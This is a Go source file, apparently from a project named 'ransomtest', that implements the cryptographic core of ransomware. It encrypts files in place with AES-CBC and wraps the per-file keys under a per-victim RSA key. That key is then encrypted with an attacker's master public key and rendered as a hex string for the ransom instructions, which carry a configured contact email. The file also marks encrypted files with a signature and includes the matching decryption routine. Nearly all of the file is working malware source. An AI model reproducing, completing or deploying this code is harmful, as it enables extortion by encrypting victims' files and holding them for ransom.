// Implements every cryptographic operations related to the ransomware

package cryptutils

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	_ "embed"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"io"
	"math/big"
	"os"
	"ransomtest/utils"
	"runtime"

	"github.com/zenazn/pkcs7pad"
)

// Generate AES IV and Key randomly
func GenAESKeyAndIV() ([]byte, []byte) {
	key := make([]byte, 32)
	iv := make([]byte, 16)

	rand.Read(key)
	rand.Read(iv)
	return key, iv
}

// Destroy AES key
func WipeKey(key *[]byte) {
	rand.Read(*key)
}

// Delete a RSA private key not to be vulnerable to memory dump attack
func SecureDeletePrivateKey(priv *rsa.PrivateKey) {
	if priv == nil {
		return
	}
	zero := big.NewInt(0)
	priv.D.Set(zero)

	if priv.Precomputed.Dp != nil {
		priv.Precomputed.Dp.Set(zero)
	}
	if priv.Precomputed.Dq != nil {
		priv.Precomputed.Dq.Set(zero)
	}
	if priv.Precomputed.Qinv != nil {
		priv.Precomputed.Qinv.Set(zero)
	}
	*priv = rsa.PrivateKey{} // Reset struct
	priv = nil
	runtime.GC()
}

// Generate a new key pair
func GenerateKeyPair(bits int) (*rsa.PrivateKey, *rsa.PublicKey) {
	privkey, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		panic(err)
	}
	return privkey, &privkey.PublicKey
}

// Private key to PEM bytes
func PrivateKeyToBytes(priv *rsa.PrivateKey) []byte {
	privBytes := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(priv),
		},
	)
	return privBytes
}

// PEM bytes to rsa.PublicKey format
func BytesToPublicKey(buf []byte) *rsa.PublicKey {
	block, _ := pem.Decode(buf)
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	check(err)
	rsaPublickey, _ := pub.(*rsa.PublicKey)
	return rsaPublickey
}

// Deserialize bytes to public key
func BytesToPrivateKey(buf []byte) *rsa.PrivateKey {
	block, _ := pem.Decode(buf)
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	check(err)
	return priv
}

// PublicKeyToBytes public key to bytes
func PublicKeyToBytes(pub *rsa.PublicKey) []byte {
	pubASN1, err := x509.MarshalPKIXPublicKey(pub)
	check(err)
	pubBytes := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: pubASN1,
	})
	return pubBytes
}

// EncryptWithPublicKey encrypts data with public key
func EncryptWithPublicKey(msg []byte, pub *rsa.PublicKey) []byte {
	hash := sha512.New()
	ciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, pub, msg, nil)
	if err != nil {
		panic(err)
	}
	return ciphertext
}

// Encrypts a private key using a public key. Do not mess up with key sizes
func KekEncrypt(priv *rsa.PrivateKey, master_pubkey *rsa.PublicKey) []byte {
	kek_bytes := x509.MarshalPKCS1PrivateKey(priv)
	retval := append(EncryptWithPublicKey(kek_bytes[:894], master_pubkey), EncryptWithPublicKey(kek_bytes[894:894*2], master_pubkey)...)
	retval = append(retval, EncryptWithPublicKey(kek_bytes[894*2:], master_pubkey)...)
	return retval
}

// Decrypt the hex string from the instructions with the attacker private key
func KekDecrypt(kek_privkey *rsa.PrivateKey, input_string string) *rsa.PrivateKey {
	// parse input key
	input_bytes, err := hex.DecodeString(input_string)
	check(err)
	// decrypt victim key using KEK
	decrypted_privkey := append(DecryptWithPrivateKey(input_bytes[:1024], kek_privkey), DecryptWithPrivateKey(input_bytes[1024:2048], kek_privkey)...)
	decrypted_privkey = append(decrypted_privkey, DecryptWithPrivateKey(input_bytes[2048:3072], kek_privkey)...)
	priv, err := x509.ParsePKCS1PrivateKey(decrypted_privkey)
	check(err)
	return priv
}

// DecryptWithPrivateKey decrypts data with private key
func DecryptWithPrivateKey(ciphertext []byte, priv *rsa.PrivateKey) []byte {
	hash := sha512.New()
	plaintext, err := rsa.DecryptOAEP(hash, rand.Reader, priv, ciphertext, nil)
	if err != nil {
		panic(err)
	}
	return plaintext
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

const chunk_length int = 1024 * aes.BlockSize // must be a multiple of aes.blockSize
const signature int = 193481909

// File header actually put at the end, this information is mandatory for decryption process
type file_header struct {
	signature         int
	file_length       int64
	encrypted_key_len int
	iv                [16]byte
}

func (header file_header) GetLength() int {
	return 4 + 8 + 4 + 16
}

// Deserialize file header from bytes
func (header *file_header) FromBytes(data []byte) {
	if len(data) == header.GetLength() {
		header.signature = int(binary.LittleEndian.Uint32(data[:4]))
		header.file_length = int64(binary.LittleEndian.Uint64(data[4:]))
		header.encrypted_key_len = int(binary.LittleEndian.Uint32(data[4+8:]))
		copy(header.iv[:], data[4+8+4:])
	}
}

// Serialize file header to bytes
func (header file_header) ToBytes() []byte {
	retval := make([]byte, 4+8+4+16)
	binary.LittleEndian.PutUint32(retval, uint32(header.signature))
	binary.LittleEndian.PutUint64(retval[4:], uint64(header.file_length))
	binary.LittleEndian.PutUint32(retval[4+8:], uint32(header.encrypted_key_len))
	copy(retval[4+8+4:], header.iv[:])
	return retval
}

// Find the header from file path
func GetHeader(file_path string) file_header {
	f, err := os.OpenFile(file_path, os.O_RDWR, 0600)
	check(err)
	defer f.Close()
	f_stat, err := (*f).Stat()
	check(err)
	var header file_header
	header_buf := make([]byte, header.GetLength())
	f.ReadAt(header_buf, f_stat.Size()-int64(header.GetLength()))
	header.FromBytes(header_buf)
	return header
}

// Check if the file is already encrypted to avoid encrypting twice the file
func IsEncryptedFile(file_path string) bool {
	return GetHeader(file_path).signature == signature
}

// Decrypt a file using the RSA private key
func DecryptFile(file_path string, priv *rsa.PrivateKey) {
	f, err := os.OpenFile(file_path, os.O_RDWR, 0600)
	check(err)
	defer f.Close()
	f_stat, err := (*f).Stat()
	check(err)
	var header file_header

	header_buf := make([]byte, header.GetLength())
	f.ReadAt(header_buf, f_stat.Size()-int64(header.GetLength()))
	header.FromBytes(header_buf)
	if header.signature != signature {
		return // Not an encrypted file
	}
	encrypted_key := make([]byte, header.encrypted_key_len)
	f.ReadAt(encrypted_key, f_stat.Size()-int64(header.GetLength())-int64(header.encrypted_key_len))
	f.Truncate(f_stat.Size() - int64(header.GetLength()) - int64(header.encrypted_key_len))
	utils.StripMsgToFile(file_path)
	decrypted_key := DecryptWithPrivateKey(encrypted_key, priv)
	my_cipher, err := aes.NewCipher(decrypted_key[:32])
	check(err)
	mode := cipher.NewCBCDecrypter(my_cipher, header.iv[:])
	chunk := make([]byte, chunk_length)
	for offset := int64(0); offset < header.file_length; offset += int64(chunk_length) {
		n, err := f.ReadAt(chunk, offset)
		if n > 0 {
			mode.CryptBlocks(chunk, chunk)
			f.WriteAt(chunk, offset)
		}
		if err == io.EOF {
			break
		} else if err != nil {
			check(err)
		}
	}
	f.Truncate(header.file_length) // overrides pkcs7 padding
}

// Generate keypair. The private key is encrypted and converted to hex string to be given in decryption instructions
func GenerateEncKeyPair(master_pubkey *rsa.PublicKey) (*rsa.PublicKey, string) {
	privkey, pubkey := GenerateKeyPair(4096)
	//defer SecureDeletePrivateKey(privkey)
	encrypted_privkey := KekEncrypt(privkey, master_pubkey)
	return pubkey, hex.EncodeToString(encrypted_privkey)
}

// Encrypt a file with keys given by the GenerateEncKeyPair function
func EncryptFile(file_path string, pub *rsa.PublicKey, encrypted_privkey string) bool {
	key, iv := GenAESKeyAndIV()
	defer WipeKey(&key)
	enc_key := EncryptWithPublicKey(key, pub)
	f, err := os.OpenFile(file_path, os.O_RDWR, 0600)
	check(err)
	defer f.Close()

	f_stat, err := (*f).Stat()
	check(err)
	file_length := f_stat.Size()
	if file_length < aes.BlockSize { // discard
		return false
	}

	block, err := aes.NewCipher(key[:])
	check(err)

	mode := cipher.NewCBCEncrypter(block, iv[:])

	chunk := make([]byte, chunk_length)
	defer rand.Read(chunk) // secure delete part of plain text

	header := file_header{
		signature:         signature,
		file_length:       file_length,
		encrypted_key_len: len(enc_key),
		iv:                [16]byte(iv),
	}

	for offset := int64(0); offset < file_length; offset += int64(chunk_length) {
		n, err := f.ReadAt(chunk, offset)
		if n > 0 {
			if n < chunk_length && n%aes.BlockSize != 0 {
				enc_chunk := pkcs7pad.Pad(chunk, aes.BlockSize)
				mode.CryptBlocks(enc_chunk, enc_chunk)
				f.WriteAt(enc_chunk, offset)
			} else {
				mode.CryptBlocks(chunk, chunk)
				f.WriteAt(chunk, offset)
			}
		}
		if err == io.EOF {
			break
		} else if err != nil {
			check(err)
		}
	}
	utils.AddMsgToFile(file_path, utils.GetConfItem("email_addr"), encrypted_privkey)
	f.Seek(0, io.SeekEnd)
	f.Write(enc_key)
	f.Write(header.ToBytes())
	return true
}
